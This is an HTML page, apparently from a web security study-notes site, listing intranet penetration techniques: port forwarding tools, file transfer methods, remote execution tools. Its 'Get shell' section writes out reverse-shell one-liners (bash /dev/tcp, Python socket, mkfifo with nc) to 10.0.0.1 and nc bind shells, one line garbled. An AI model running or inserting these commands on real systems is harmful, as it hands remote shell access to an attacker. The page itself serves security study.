@@ -1,0 +1,202 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>5.4. Comprehensive skills &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="5.5. Reference link" href="ref.html" />
+    <link rel="prev" title="5.3. Backdoor technology" href="trojan.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="index.html">5. Intranet penetration</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="windows/index.html">5.1. Windows intranet penetration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="linux/index.html">5.2. Linux intranet penetration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="trojan.html">5.3. Backdoor technology</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">5.4. Comprehensive skills</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#port-forwarding">5.4.1. Port Forwarding</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#get-shell">5.4.2. Get shell</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#intranet-file-transfer">5.4.3. Intranet file transfer</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#remote-connection-execute-the-program">5.4.4. Remote connection &amp;&amp; Execute the program</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="ref.html">5.5. Reference link</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="index.html"><span class="section-number">5. </span>Intranet penetration</a></li>
+      <li class="breadcrumb-item active"><span class="section-number">5.4. </span>Comprehensive skills</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/intranet/misc.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="comprehensive-skills">
+<h1><span class="section-number">5.4. </span>Comprehensive skills<a class="headerlink" href="#comprehensive-skills" title="Link to this heading"></a></h1>
+<section id="port-forwarding">
+<h2><span class="section-number">5.4.1. </span>Port Forwarding<a class="headerlink" href="#port-forwarding" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>windows</p></li>
+<li><p>LCX</p></li>
+<li><p>Netsh</p></li>
+<li><p>linux</p></li>
+<li><p>portmap</p></li>
+<li><p>iptables</p></li>
+<li><p>socket proxy</p></li>
+<li><p>Win: xsocks</p></li>
+<li><p>Linux: proxychains</p></li>
+<li><p>http-based forwarding and socket proxy (penetration under low privileges)</p></li>
+<li><p>Port Forwarding: tunna</p></li>
+<li><p>socks proxy: reGeorg</p></li>
+<li><p>ssh channel</p></li>
+<li><p>Port Forwarding</p></li>
+<li><p>socks</p></li>
+</ul>
+</section>
+<section id="get-shell">
+<h2><span class="section-number">5.4.2. </span>Get shell<a class="headerlink" href="#get-shell" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Regular shell rebound</p></li>
+</ul>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</p>
+<ul class="simple">
+<li><p>Imcp_shell rebound that breaks through the firewall</p></li>
+<li><p>Forward shell</p></li>
+</ul>
+<p>nc -e /bin/n-pn-pn-pp 1234
+nc.exe -e cmd.exe -lp 1234</p>
+</section>
+<section id="intranet-file-transfer">
+<h2><span class="section-number">5.4.3. </span>Intranet file transfer<a class="headerlink" href="#intranet-file-transfer" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>File transfer under windows</p></li>
+<li><p>powershell</p></li>
+<li><p>vbs script file</p></li>
+<li><p>bitsadmin</p></li>
+<li><p>File Sharing</p></li>
+<li><p>Receive data using telnet</p></li>
+<li><p>hta</p></li>
+<li><p>File transfer under linux</p></li>
+<li><p>Python</p></li>
+<li><p>wget</p></li>
+<li><p>Tar + SSH</p></li>
+<li><p>Transfer data using dns</p></li>
+<li><p>File Compilation</p></li>
+<li><p>powershell converts exe to txt, and then converts txt to exe</p></li>
+</ul>
+</section>
+<section id="remote-connection-execute-the-program">
+<h2><span class="section-number">5.4.4. </span>Remote connection &amp;&amp; Execute the program<a class="headerlink" href="#remote-connection-execute-the-program" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>at&amp;schtasks</p></li>
+<li><p>psexec</p></li>
+<li><p>wmic</p></li>
+<li><p>wmiexec.vbs</p></li>
+<li><p>smbexec</p></li>
+<li><p>powershell remoting</p></li>
+<li><p>SC Creation Service Execution</p></li>
+<li><p>schtasks</p></li>
+<li><p>SMB+MOF || DLL Hijacks</p></li>
+<li><p>PTH + compmgmt.msc</p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="trojan.html" class="btn btn-neutral float-left" title="5.3. Backdoor technology" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="ref.html" class="btn btn-neutral float-right" title="5.5. Reference link" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
